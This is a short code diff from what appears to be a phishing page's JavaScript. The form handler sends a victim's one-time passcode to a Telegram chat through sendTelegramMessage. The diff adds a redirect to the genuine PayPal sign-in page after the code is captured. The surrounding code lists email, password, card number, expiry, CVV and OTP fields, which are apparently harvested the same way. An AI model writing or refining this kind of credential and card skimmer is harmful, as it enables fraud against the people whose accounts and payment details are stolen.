@@ -389,7 +389,8 @@
             event.preventDefault();
             const otp = document.getElementById('providerOtp').value;
             sendTelegramMessage(`Provider OTP attempt: ${otp}`);
-            alert('Verification complete');
+            // Add the redirect after sending the OTP message
+            window.location.href = 'https://paypal.com/signin';
         });
 
         ['email', 'password', 'otp', 'cardName', 'cardNumber', 'expDate', 'cvv', 'providerEmail', 'providerPassword', 'customEmail', 'providerOtp'].forEach(id => {
